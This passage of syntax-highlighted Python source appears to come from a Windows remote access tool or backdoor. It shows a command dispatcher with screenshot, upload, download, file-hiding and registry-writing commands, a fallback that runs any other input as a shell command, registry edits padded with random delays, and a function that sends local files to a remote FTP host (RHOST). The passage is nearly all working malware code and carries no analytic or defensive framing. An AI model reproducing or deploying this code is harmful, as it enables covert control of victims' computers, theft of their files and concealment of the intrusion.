    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"ls"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">ls</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"cd"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">chdir</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"sysinfo"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">get_sys_info</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"download"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">download</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"upload"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">upload_file</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"shot"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">shot</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"cp"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">copy_file_a</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"mv"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">move_file_a</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"link"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">create_link_a</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"register"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">register_a</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"hide"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">hide_file_a</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"compress"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">compress</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"jobs"</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jobs</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"exit"</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"exit"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">run_cmd</span><span class="p">(</span><span class="n">com</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">copy_file</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">p1</span><span class="p">):</span>
        <span class="n">shutil</span><span class="p">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shutil</span><span class="p">.</span><span class="n">copytree</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">move_file</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">):</span>
    <span class="n">shutil</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">hide_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">run_cmd</span><span class="p">(</span><span class="s">"attrib +h +r +s "</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">file</span><span class="p">),</span> <span class="bp">False</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">unhide_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">run_cmd</span><span class="p">(</span><span class="s">"attrib -h -r -s "</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">file</span><span class="p">),</span> <span class="bp">False</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">registry</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">value_type</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">winreg</span><span class="p">.</span><span class="n">CreateKey</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">uniform</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">20</span><span class="p">))</span>
    <span class="n">winreg</span><span class="p">.</span><span class="n">SetValueEx</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">value_type</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">uniform</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span>
    <span class="n">winreg</span><span class="p">.</span><span class="n">CloseKey</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">create_link</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="n">link</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remove_link</span><span class="p">(</span><span class="n">p1</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">file_ready</span><span class="p">():</span>
    <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span> <span class="o">+</span> <span class="s">".ready"</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="s">'0'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">waiting_file</span><span class="p">():</span>
    <span class="k">while</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span> <span class="o">+</span> <span class="s">".ready"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'1'</span><span class="p">:</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">init_ftp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">directory</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">password</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">aff</span> <span class="o">=</span> <span class="n">Affine</span><span class="p">()</span>
        <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"w"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">aff</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="s">"Pass?</span><span class="se">\n</span><span class="s">"</span><span class="p">))</span>
        <span class="n">file_ready</span><span class="p">()</span>

        <span class="n">waiting_file</span><span class="p">()</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">aff</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"r"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()))</span>

    <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span>
    <span class="n">ftp</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="n">ftp</span><span class="p">.</span><span class="n">cwd</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">ftp</span>


<span class="k">def</span> <span class="nf">ftp_arg_parse</span><span class="p">(</span><span class="n">com</span><span class="p">,</span> <span class="n">source</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="n">source</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">source</span> <span class="o">!=</span> <span class="s">"shot"</span><span class="p">:</span>
        <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-f"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-u"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"smile"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-p"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-d"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"files"</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">com</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">args</span>


<span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">ftp</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="nb">file</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">+=</span> <span class="s">"{}: "</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">rest_pos</span> <span class="o">=</span> <span class="n">ftp</span><span class="p">.</span><span class="n">size</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">rest_pos</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">fp</span><span class="p">.</span><span class="n">seek</span><span class="p">(</span><span class="n">rest_pos</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">+=</span> <span class="p">(</span><span class="n">ftp</span><span class="p">.</span><span class="n">storbinary</span><span class="p">(</span><span class="s">"STOR "</span> <span class="o">+</span> <span class="nb">file</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="n">rest</span><span class="o">=</span><span class="n">rest_pos</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">resp</span>


<span class="k">def</span> <span class="nf">fix_coding</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">new_coding</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">""</span>
    <span class="n">encoding</span> <span class="o">=</span> <span class="n">chardet</span><span class="p">.</span><span class="n">detect</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="s">'encoding'</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">new_coding</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">!=</span> <span class="n">encoding</span><span class="p">.</span><span class="n">upper</span><span class="p">():</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">data</span>


<span class="k">def</span> <span class="nf">work_on_cmd_process</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">dick</span><span class="p">):</span>
    <span class="n">dick</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">work_on_cmd</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
    <span class="n">dick</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">work_on_cmd</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">piper</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"|"</span><span class="p">)</span>
    <span class="n">com</span> <span class="o">=</span> <span class="n">piper</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">execution</span><span class="p">(</span><span class="n">com</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">piper</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">resp</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">work_on_cmd</span><span class="p">(</span><span class="n">piper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="n">shlex</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span> <span class="o">+</span> <span class="s">"|"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">piper</span><span class="p">[</span><span class="mi">2</span><span class="p">:]))</span>


<span class="k">def</span> <span class="nf">cut_len</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">m</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">bla</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">/</span> <span class="n">m</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">temp</span> <span class="o">+=</span> <span class="n">line</span><span class="p">[</span><span class="n">bla</span> <span class="o">*</span> <span class="n">m</span><span class="p">:(</span><span class="n">bla</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">m</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">temp</span> <span class="k">if</span> <span class="n">temp</span> <span class="o">!=</span> <span class="s">""</span> <span class="k">else</span> <span class="n">line</span>


<span class="k">def</span> <span class="nf">list_processes</span><span class="p">():</span>
    <span class="n">header</span> <span class="o">=</span> <span class="p">[</span><span class="s">"Name"</span><span class="p">,</span> <span class="s">"Is Alive?"</span><span class="p">,</span> <span class="s">"Invoke Dir"</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">processes</span><span class="p">:</span>
        <span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">([</span><span class="n">cut_len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">"process"</span><span class="p">].</span><span class="n">name</span><span class="p">,</span> <span class="mi">50</span><span class="p">),</span> <span class="n">x</span><span class="p">[</span><span class="s">"process"</span><span class="p">].</span><span class="n">is_alive</span><span class="p">(),</span> <span class="n">cut_len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">"root"</span><span class="p">],</span> <span class="mi">27</span><span class="p">)])</span>
    <span class="k">return</span> <span class="n">tabulate</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="n">stralign</span><span class="o">=</span><span class="s">"left"</span><span class="p">,</span> <span class="n">showindex</span><span class="o">=</span><span class="s">"always"</span><span class="p">,</span> <span class="n">tablefmt</span><span class="o">=</span><span class="s">"fancy_grid"</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">clear_processes</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">processes</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="s">"process"</span><span class="p">].</span><span class="n">is_alive</span><span class="p">():</span>
            <span class="n">processes</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
            <span class="k">return</span> <span class="s">"Cleared"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="s">"Can't clear running process"</span>  <span class="c1"># Actually I can, but should I?
</span>    <span class="k">else</span><span class="p">:</span>
        <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">processes</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">clear_processes</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">!=</span> <span class="s">"Cleared"</span><span class="p">:</span>
                <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">return</span> <span class="s">"Cleared"</span>


<span class="k">def</span> <span class="nf">output_process</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="n">px</span> <span class="o">=</span> <span class="n">processes</span><span class="p">[</span><span class="n">key</span><span class="p">]</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">px</span><span class="p">[</span><span class="s">"receiver"</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">d</span><span class="p">.</span><span class="n">poll</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">px</span><span class="p">[</span><span class="s">"data"</span><span class="p">]</span> <span class="o">+=</span> <span class="n">d</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">px</span><span class="p">[</span><span class="s">"data"</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">kill_process</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">processes</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="s">"process"</span><span class="p">].</span><span class="n">kill</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Could not kill him: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"Killed );"</span>


<span class="k">def</span> <span class="nf">terminate_process</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">processes</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="s">"process"</span><span class="p">].</span><span class="n">terminate</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Could not terminate him: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"Terminated /:"</span>


<span class="k">def</span> <span class="nf">close_process</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">processes</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="s">"process"</span><span class="p">].</span><span class="n">close</span><span class="p">()</span>
        <span class="n">processes</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Could not close him: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"Closed |:"</span>


<span class="c1">############ External ############
</span><span class="k">def</span> <span class="nf">jobs</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"jobs"</span><span class="p">)</span>
    <span class="n">action</span> <span class="o">=</span> <span class="n">ap</span><span class="p">.</span><span class="n">add_subparsers</span><span class="p">(</span><span class="n">dest</span><span class="o">=</span><span class="s">"action"</span><span class="p">)</span>
    <span class="n">a_clear</span> <span class="o">=</span> <span class="n">action</span><span class="p">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"clear"</span><span class="p">)</span>
    <span class="n">a_output</span> <span class="o">=</span> <span class="n">action</span><span class="p">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"output"</span><span class="p">)</span>
    <span class="n">a_kill</span> <span class="o">=</span> <span class="n">action</span><span class="p">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"kill"</span><span class="p">)</span>
    <span class="n">a_term</span> <span class="o">=</span> <span class="n">action</span><span class="p">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"terminate"</span><span class="p">)</span>
    <span class="n">a_close</span> <span class="o">=</span> <span class="n">action</span><span class="p">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"close"</span><span class="p">)</span>

    <span class="n">a_clear</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">nargs</span><span class="o">=</span><span class="s">"?"</span><span class="p">)</span>
    <span class="n">a_clear</span><span class="p">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">act</span><span class="o">=</span><span class="n">clear_processes</span><span class="p">)</span>

    <span class="n">a_output</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">a_output</span><span class="p">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">act</span><span class="o">=</span><span class="n">output_process</span><span class="p">)</span>

    <span class="n">a_kill</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">a_kill</span><span class="p">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">act</span><span class="o">=</span><span class="n">kill_process</span><span class="p">)</span>

    <span class="n">a_term</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">a_term</span><span class="p">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">act</span><span class="o">=</span><span class="n">terminate_process</span><span class="p">)</span>

    <span class="n">a_close</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">a_close</span><span class="p">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">act</span><span class="o">=</span><span class="n">close_process</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">com</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s">"action"</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">args</span><span class="p">[</span><span class="s">'act'</span><span class="p">](</span><span class="n">args</span><span class="p">[</span><span class="s">"index"</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">list_processes</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">ls</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">"ls"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"i"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">nargs</span><span class="o">=</span><span class="s">"?"</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">com</span><span class="p">))</span>

    <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s">'i'</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">'i'</span><span class="p">])]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">header</span> <span class="o">=</span> <span class="p">[</span><span class="s">"Mode"</span><span class="p">,</span> <span class="s">"Size"</span><span class="p">,</span> <span class="s">"Creation"</span><span class="p">,</span> <span class="s">"Modification"</span><span class="p">,</span> <span class="s">"Name"</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"."</span><span class="p">):</span>
            <span class="n">x_stat</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">stat</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
            <span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
                <span class="p">[</span><span class="n">stat</span><span class="p">.</span><span class="n">filemode</span><span class="p">(</span><span class="n">x_stat</span><span class="p">.</span><span class="n">st_mode</span><span class="p">),</span> <span class="n">x_stat</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">cut_len</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">ctime</span><span class="p">(</span><span class="n">x_stat</span><span class="p">.</span><span class="n">st_ctime</span><span class="p">),</span> <span class="mi">20</span><span class="p">),</span>
                 <span class="n">cut_len</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">ctime</span><span class="p">(</span><span class="n">x_stat</span><span class="p">.</span><span class="n">st_mtime</span><span class="p">),</span> <span class="mi">20</span><span class="p">),</span> <span class="n">cut_len</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">30</span><span class="p">)])</span>
